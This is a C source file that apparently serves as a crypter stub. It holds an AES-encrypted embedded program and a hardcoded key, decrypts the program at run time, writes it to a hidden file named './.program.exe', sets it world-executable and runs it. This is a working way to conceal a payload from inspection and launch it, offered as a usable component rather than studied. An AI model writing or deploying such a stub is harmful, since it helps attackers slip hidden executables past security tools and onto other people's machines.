/* All the data needed for the stub run that cames from the gen program goes here */

#include <unistd.h>
#include <string.h>

#include "general.h"
#include "lib/aes.h"
#include "lib/file.h"

// These definitions are just for testing
#ifndef ENC_CONTENT
 #define ENC_CONTENT {0xba, 0xdd, 0x47, 0x5, 0x30, 0x2f, 0x21, 0xb7, 0x7a, 0xba, 0x63, 0xd3, 0x49, 0x29, 0x35, 0xcd}
#endif
#ifndef ENC_SIZE
 #define ENC_SIZE 16
#endif
#ifndef KEY
 #define KEY {48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 65, 66, 67, 68, 69, 70}
#endif
#ifndef PATH
 #define PATH "./.program.exe"
#endif


void run(const char *path) {
  #if (defined __unix__) || (defined unix) || (defined __linux__) || (defined linux)
    chmod(path, 00777);
  #endif

    execl(path, path, (char *) NULL);
}


int main(void) {
    if(file_exists(PATH)) {
        run(PATH);
        return 0;
    }

    /* Get the data that came from the main program */
    uint8_t key[] = KEY;
    uint8_t content[] = ENC_CONTENT;
    uint8_t iv[] = IV;
    SIZ size = ENC_SIZE;

    size_t pathSize = strlen(PATH) + 10;
    char *path = malloc(pathSize);
    if(path == NULL)
        return 0;

    memset(path, 0, pathSize);
    if( !( (strstr(PATH, "/") != NULL) || (strstr(PATH, "\\") != NULL) ))
        strcat(path, "./");
    strcat(path, PATH);

    /* Decrypt */
    struct AES_ctx context;
    AES_init_ctx_iv(&context, key, iv);
    AES_CBC_decrypt_buffer(&context, content, size);

    /* Remove pading */
    uint8_t pad = content[size - 1];
    size -= pad;

    /* Write output program */
    UNIV_FILE file = file_open(path, M_WRITE_NEW);
    file_write(content, size, file);
    file_close(file);

    run(path);
    free(path);
    return 0;
}
